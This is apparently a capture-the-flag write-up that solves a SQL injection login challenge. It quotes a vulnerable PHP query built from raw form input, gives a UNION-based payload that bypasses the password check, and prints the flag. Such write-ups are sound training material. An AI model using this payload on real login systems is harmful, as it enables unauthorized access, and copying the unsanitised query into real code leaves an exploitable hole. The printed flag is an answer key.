# [SQL Injection Level 2](http://s1063.vdi.mipt.ru:8000/challenges#SQL%20Injection%20Level%202)
### [Login form](http://chall1.ctf.pwne.xyz:5555/level2/)

# Solution
1. Analyze the code.
```php 
$query = "SELECT * FROM users WHERE username='{$_POST['username']}'";

if (mysqli_num_rows($result) == 1)
{
	$row = $result->fetch_assoc();
	if ($row['password'] === $_POST['password'])
	{
		echo $success_page;
	}
}
```
2. Suppose we inserted to query some row, e.g. `username='test', password='test'`. Then we can get to success page.
3. We can input: 
username: `' union select 0, 'test', 'test';#`
password: `test`

**Answer**: `flag{bab5ac671c3fbc16daac54506ac3ea5a}`